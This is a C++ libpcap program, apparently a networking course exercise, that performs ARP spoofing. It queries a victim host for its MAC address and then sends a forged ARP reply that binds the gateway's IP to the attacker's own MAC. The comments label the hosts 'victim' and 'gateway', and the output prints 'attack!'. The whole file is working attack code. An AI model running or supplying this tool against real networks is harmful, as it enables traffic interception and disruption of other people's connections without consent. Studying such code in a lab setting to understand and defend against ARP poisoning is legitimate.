#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("Please follow this rule: \n");
	printf("syntax: sudo ./send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: sudo ./send-arp-test wlan0 192.168.37.96 192.168.37.136\n"); //me: enp0s3, sender is victim, target is gateway
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// get my mac addr and my ip addr
	int sock;
	struct ifreq ifr;
	
	int fd;
	
	memset(&ifr, 0x00, sizeof(ifr));
	strcpy(ifr.ifr_name, argv[1]);
	
	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "socket error\n");
		exit(0);
	}
	
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		fprintf(stderr, "ioctl error\n");
		exit(0);
	}
	uint8_t *my_mac = (uint8_t *)malloc(sizeof(uint8_t) * 6);
	for (int i = 0; i < 6; i++) {
		*(my_mac+i) = *(uint8_t *)(ifr.ifr_hwaddr.sa_data + i);
	}
	
	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		fprintf(stderr, "ioctl error2\n");
		exit(0);
	}
	uint8_t *my_ip = (uint8_t *)ifr.ifr_addr.sa_data;
	uint32_t ip2 = (*(my_ip+2) << 24) + (*(my_ip+3) << 16) + (*(my_ip+4) << 8) + *(my_ip+5);
		
	// repeat
	for (int i = 0; i < (argc - 2) / 2; i++) {
		// send normal ARP
		EthArpPacket pre_packet; // eth, arp header <- each two.

		pre_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
		pre_packet.eth_.smac_ = Mac(my_mac); // 0x 08 00 27 ~
		pre_packet.eth_.type_ = htons(EthHdr::Arp);
		
		pre_packet.arp_.hrd_ = htons(ArpHdr::ETHER); // H/W type
		pre_packet.arp_.pro_ = htons(EthHdr::Ip4); // Protocol type, 0x0800
		pre_packet.arp_.hln_ = Mac::SIZE; // H/W addr(MAC addr) length
		pre_packet.arp_.pln_ = Ip::SIZE; // Protocol addr length, if IPv4 then 4byte.
		pre_packet.arp_.op_ = htons(ArpHdr::Request); // opcode: if req then 1, reply then 2
		pre_packet.arp_.smac_ = Mac(my_mac);
		pre_packet.arp_.sip_ = htonl(Ip(ip2));
		pre_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		pre_packet.arp_.tip_ = htonl(Ip(argv[2*i + 2])); // in order to get sender's mac 0-2, 1-4, 2-6
		
		/*
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pre_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket1 return %d error=%s\n", res, pcap_geterr(handle));
		}
		*/
		
		
		// get MAC
		EthArpPacket attack_packet;
		
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet1;
			
			// repeat sending until get victim's mac address
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pre_packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket1 return %d error=%s\n", res, pcap_geterr(handle));
			}
			//sleep(1);
			
			
			int res2 = pcap_next_ex(handle, &header, &packet1); // receive packet
			
			if (res2 == 0) continue;
			if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
				break;
			}
			
			// check whether the packet is about ARP
			if (!((uint8_t)*(packet1 + 12) == 8 && (uint8_t)*(packet1 + 13) == 6)) {
				//printf("b1 %x\n", (uint8_t)*(packet1 + 13)); // for debug
				continue;
			}
			
			// get the packet's dst mac addr and check whether it is equal to mine.
			uint8_t *temp = (uint8_t *)malloc(sizeof(uint8_t) * 6);
			for (int i = 0; i < 6; i++) {
				*(temp+i) = *(uint8_t *)(packet1 + i);
			}
			if (!(Mac(temp) == pre_packet.eth_.smac_)) {
				//printf("b2 \n"); // for debug
				continue;
			}
			
			//printf("equal!\n");
			
			// insert src mac addr(==victim's) into attack packet
			attack_packet.eth_.dmac_ = Mac((uint8_t *)(packet1 + 6));
			attack_packet.arp_.tmac_ = Mac((uint8_t *)(packet1 + 6));
			break;
		}
		
		
		printf("attack!\n");
		fflush(stdout);
		// attack
		attack_packet.eth_.smac_ = Mac(my_mac);
		attack_packet.eth_.type_ = htons(EthHdr::Arp);
		
		attack_packet.arp_.hrd_ = htons(ArpHdr::ETHER); // H/W type
		attack_packet.arp_.pro_ = htons(EthHdr::Ip4); // Protocol type, 0x0800
		attack_packet.arp_.hln_ = Mac::SIZE; // H/W addr(MAC addr) length
		attack_packet.arp_.pln_ = Ip::SIZE; // Protocol addr length, if IPv4 then 4byte.
		attack_packet.arp_.op_ = htons(ArpHdr::Reply); // opcode: if req then 1, reply then 2
		attack_packet.arp_.smac_ = Mac(my_mac);
		attack_packet.arp_.sip_ = htonl(Ip(argv[2*i + 3])); // in order to attack
		attack_packet.arp_.tip_ = htonl(Ip(argv[2*i + 2])); // in order to attack

		int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
		if (res3 != 0) {
			fprintf(stderr, "pcap_sendpacket2 return %d error=%s\n", res3, pcap_geterr(handle));
		}
	}
	
	pcap_close(handle);
}
